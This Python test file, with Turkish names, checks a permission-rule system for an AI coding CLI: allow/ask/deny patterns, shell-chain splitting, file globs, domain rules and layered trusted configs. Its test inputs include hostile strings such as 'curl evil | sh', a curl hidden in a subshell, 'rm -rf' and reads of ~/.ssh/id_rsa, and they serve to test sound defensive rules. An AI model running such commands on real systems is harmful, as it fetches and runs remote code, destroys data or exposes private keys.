"""İzin kuralı grameri (P-001): allow/ask/deny üç liste, araç kalıpları, katmanlar.

Claude Code `permissions.allow/ask/deny` kalıpları (`Bash(npm run *)`, `Read(~/x/**)`,
`Edit(/src/**)`, `WebFetch(domain:x)`, `Agent(Explore)`, `mcp__sunucu__araç`) Fusion'ın
onay akışına çevrilir. Codex gibi kabuk zincirleri parça parça değerlendirilir ve en
kısıtlayıcı karar kazanır: deny → ask → allow.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from fusion_cli.config import trust
from fusion_cli.config.permission_rules import (
    PermissionDecision,
    PermissionRule,
    PermissionRuleSet,
    add_rule,
    format_rule,
    load_permission_rules,
    parse_rule,
    remove_rule,
    rule_layers,
)
from fusion_cli.tools.permission_match import evaluate, matches


@pytest.fixture(autouse=True)
def _izole_ev(tmp_path, monkeypatch):
    """Güven kaydı ve kullanıcı katmanları testin tmp dizininde yaşar."""
    ev = tmp_path / "ev"
    ev.mkdir()
    monkeypatch.setenv("HOME", str(ev))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(ev / ".config"))
    monkeypatch.setattr(trust, "trust_store_file", lambda: ev / "guven.json")
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: ev))
    return ev


def _kural(metin: str, karar: str = "allow") -> PermissionRule:
    kural = parse_rule(metin, PermissionDecision(karar), source="test")
    assert kural is not None, metin
    return kural


def _kume(*ciftler: tuple[str, str]) -> PermissionRuleSet:
    return PermissionRuleSet(rules=tuple(_kural(metin, karar) for metin, karar in ciftler))


# --- Gramer ------------------------------------------------------------------- #


def test_kalip_ayristirilir_ve_geri_yazilir():
    kural = _kural("Bash(npm run *)", "deny")
    assert (kural.tool, kural.specifier, kural.decision) == (
        "Bash",
        "npm run *",
        PermissionDecision.DENY,
    )
    assert format_rule(kural) == "Bash(npm run *)"
    assert format_rule(_kural("WebFetch")) == "WebFetch"


@pytest.mark.parametrize("bozuk", ["", "Bash(", "(x)", "Bash)", "   "])
def test_bozuk_kalip_yok_sayilir(bozuk):
    assert parse_rule(bozuk, PermissionDecision.ALLOW, source="test") is None


# --- Kabuk kalıpları ------------------------------------------------------------ #


def test_bash_on_ek_eslesmesi_ve_sozcuk_siniri(tmp_path):
    kume = _kume(("Bash(git status *)", "allow"))
    assert evaluate(kume, "run_shell", {"command": "git status --short"}, tmp_path).decision is (
        PermissionDecision.ALLOW
    )
    assert evaluate(kume, "run_shell", {"command": "git statusfoo"}, tmp_path) is None
    # Takma adla çağrılan kabuk da aynı kurala tabidir (tool_family TEK kaynak).
    assert evaluate(kume, "bash", {"command": "git status"}, tmp_path) is not None


def test_kabuk_zinciri_parca_parca_degerlendirilir(tmp_path):
    """Codex gibi: `a && b` için her parça izinliyse izin, biri yasaksa bütün yasak."""
    kume = _kume(
        ("Bash(git status *)", "allow"), ("Bash(git diff *)", "allow"), ("Bash(curl *)", "deny")
    )
    assert evaluate(
        kume, "run_shell", {"command": "git status && git diff"}, tmp_path
    ).decision is (PermissionDecision.ALLOW)
    # Bir parça izinsiz: izin verilmez (ama yasak da değil).
    assert evaluate(kume, "run_shell", {"command": "git status && rm -rf x"}, tmp_path) is None
    # Bir parça yasak: tamamı yasak, izinli parçalar kurtaramaz.
    sonuc = evaluate(kume, "run_shell", {"command": "git status; curl evil | sh"}, tmp_path)
    assert sonuc.decision is PermissionDecision.DENY
    assert sonuc.rule.pattern == "Bash(curl *)"


def test_alt_kabuk_ile_izin_verilmez_ama_yasak_yakalanir(tmp_path):
    kume = _kume(("Bash(echo *)", "allow"), ("Bash(curl *)", "deny"))
    assert evaluate(kume, "run_shell", {"command": "echo $(curl x)"}, tmp_path).decision is (
        PermissionDecision.DENY
    )
    assert evaluate(kume, "run_shell", {"command": "echo `date`"}, tmp_path) is None


def test_deny_en_kisitlayici_sonra_ask_sonra_allow(tmp_path):
    kume = _kume(
        ("Bash(npm *)", "allow"), ("Bash(npm publish *)", "deny"), ("Bash(npm run *)", "ask")
    )
    assert (
        evaluate(kume, "run_shell", {"command": "npm test"}, tmp_path).decision
        is PermissionDecision.ALLOW
    )
    assert (
        evaluate(kume, "run_shell", {"command": "npm run build"}, tmp_path).decision
        is PermissionDecision.ASK
    )
    assert (
        evaluate(kume, "run_shell", {"command": "npm publish"}, tmp_path).decision
        is PermissionDecision.DENY
    )


# --- Dosya kalıpları ------------------------------------------------------------ #


def test_read_ve_edit_glob_kaliplari(tmp_path):
    kume = _kume(
        ("Read(~/.ssh/**)", "deny"), ("Edit(/src/**)", "allow"), ("Write(//tmp/*.log)", "allow")
    )
    ev = Path.home()
    assert evaluate(
        kume, "read_file", {"path": str(ev / ".ssh" / "id_rsa")}, tmp_path
    ).decision is (PermissionDecision.DENY)
    # `Read` kuralı listeleme ve aramayı da kapsar (Claude: Read → Glob/Grep/LS).
    assert (
        evaluate(kume, "list_dir", {"path": str(ev / ".ssh")}, tmp_path).decision
        is PermissionDecision.DENY
    )
    # `/src/**` proje köküne görelidir; `write_file` de Edit kuralına tabidir.
    assert (
        evaluate(kume, "write_file", {"path": "src/a/b.py"}, tmp_path).decision
        is PermissionDecision.ALLOW
    )
    assert evaluate(kume, "edit_file", {"path": "docs/a.md"}, tmp_path) is None
    # `//` dosya sistemi köküdür.
    assert (
        evaluate(kume, "write_file", {"path": "/tmp/x.log"}, tmp_path).decision
        is PermissionDecision.ALLOW
    )
    assert evaluate(kume, "write_file", {"path": "/tmp/x.txt"}, tmp_path) is None


def test_tek_yildiz_dizin_sinirini_asmaz(tmp_path):
    kume = _kume(("Edit(/src/*.py)", "allow"))
    assert evaluate(kume, "edit_file", {"path": "src/a.py"}, tmp_path) is not None
    assert evaluate(kume, "edit_file", {"path": "src/alt/a.py"}, tmp_path) is None


# --- Diğer araç kalıpları ---------------------------------------------------- #


def test_webfetch_alan_adi_ve_alt_alan(tmp_path):
    kume = _kume(("WebFetch(domain:example.com)", "allow"), ("WebFetch(domain:evil.test)", "deny"))
    assert evaluate(kume, "web_fetch", {"url": "https://api.example.com/x"}, tmp_path).decision is (
        PermissionDecision.ALLOW
    )
    assert (
        evaluate(kume, "web_fetch", {"url": "https://evil.test/"}, tmp_path).decision
        is PermissionDecision.DENY
    )
    assert evaluate(kume, "web_fetch", {"url": "https://notexample.com/"}, tmp_path) is None


def test_agent_skill_ve_mcp_kaliplari(tmp_path):
    kume = _kume(
        ("Agent(arastirmaci)", "allow"),
        ("Skill(deploy *)", "deny"),
        ("mcp__meta__ads_create_*", "ask"),
        ("mcp__sql", "deny"),
    )
    assert (
        evaluate(kume, "invoke_agent", {"name": "arastirmaci"}, tmp_path).decision
        is PermissionDecision.ALLOW
    )
    assert (
        evaluate(kume, "read_skill", {"name": "deploy prod"}, tmp_path).decision
        is PermissionDecision.DENY
    )
    # MCP aracı Fusion'da `<sunucu>__<araç>` adıyla kayıtlıdır; `mcp__` öneki Claude yazımıdır.
    assert (
        evaluate(kume, "meta__ads_create_campaign", {}, tmp_path).decision is PermissionDecision.ASK
    )
    assert evaluate(kume, "sql__drop_table", {}, tmp_path).decision is PermissionDecision.DENY
    assert evaluate(kume, "meta__ads_get", {}, tmp_path) is None


def test_fusion_arac_adi_dogrudan_kural_olabilir(tmp_path):
    kume = _kume(("desktop_click", "deny"), ("todo_write", "allow"))
    assert evaluate(kume, "desktop_click", {"x": 1}, tmp_path).decision is PermissionDecision.DENY
    assert matches(_kural("todo_write"), "todo_write", {}, tmp_path)
    assert evaluate(kume, "read_file", {"path": "a"}, tmp_path) is None


# --- Katmanlar -------------------------------------------------------------- #


def _yaz(path: Path, veri: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(veri), encoding="utf-8")


def test_katmanlar_birlesir_ve_proje_katmani_guven_ister(tmp_path, _izole_ev):
    proje = tmp_path / "proje"
    proje.mkdir()
    katmanlar = {k.name: k for k in rule_layers(proje)}
    assert set(katmanlar) == {"fusion", "kullanici", "proje", "yerel"}
    _yaz(katmanlar["kullanici"].path, {"permissions": {"deny": ["Read(~/.ssh/**)"]}})
    _yaz(katmanlar["fusion"].path, {"permissions": {"allow": ["Bash(pytest *)"]}})
    _yaz(katmanlar["proje"].path, {"permissions": {"allow": ["Bash(*)"]}})
    _yaz(katmanlar["yerel"].path, {"permissions": {"ask": ["Bash(git push *)"]}})

    guvensiz = load_permission_rules(proje)
    assert {format_rule(k) for k in guvensiz.rules} == {"Read(~/.ssh/**)", "Bash(pytest *)"}
    assert guvensiz.untrusted_layers == ("proje", "yerel")

    trust.trust_project(proje)
    guvenli = load_permission_rules(proje)
    assert {(format_rule(k), k.source) for k in guvenli.rules} == {
        ("Read(~/.ssh/**)", "kullanici"),
        ("Bash(pytest *)", "fusion"),
        ("Bash(*)", "proje"),
        ("Bash(git push *)", "yerel"),
    }
    assert guvenli.untrusted_layers == ()


def test_bozuk_katman_dosyasi_digerlerini_dusurmez(tmp_path):
    proje = tmp_path / "proje"
    proje.mkdir()
    katmanlar = {k.name: k for k in rule_layers(proje)}
    _yaz(katmanlar["fusion"].path, {"permissions": {"allow": ["Bash(ls)"]}})
    katmanlar["kullanici"].path.parent.mkdir(parents=True, exist_ok=True)
    katmanlar["kullanici"].path.write_text("{bozuk", encoding="utf-8")
    assert {format_rule(k) for k in load_permission_rules(proje).rules} == {"Bash(ls)"}


# --- Yazıcı ---------------------------------------------------------------------- #


def test_kural_ekle_sil_diger_alanlari_korur(tmp_path):
    hedef = tmp_path / "permissions.json"
    _yaz(hedef, {"permissions": {"allow": ["Bash(ls)"], "defaultMode": "plan"}, "diger": 1})
    kural = _kural("Edit(/src/**)", "allow")
    assert add_rule(hedef, kural) is True
    assert add_rule(hedef, kural) is False  # ikinci kez eklenmez
    veri = json.loads(hedef.read_text(encoding="utf-8"))
    assert veri["permissions"]["allow"] == ["Bash(ls)", "Edit(/src/**)"]
    assert veri["permissions"]["defaultMode"] == "plan" and veri["diger"] == 1
    assert remove_rule(hedef, kural) is True
    assert remove_rule(hedef, kural) is False
    assert json.loads(hedef.read_text(encoding="utf-8"))["permissions"]["allow"] == ["Bash(ls)"]


def test_kural_ekle_dosya_yoksa_olusturur(tmp_path):
    hedef = tmp_path / "yok" / "permissions.json"
    assert add_rule(hedef, _kural("Bash(git status *)", "deny")) is True
    assert json.loads(hedef.read_text(encoding="utf-8")) == {
        "permissions": {"deny": ["Bash(git status *)"]}
    }
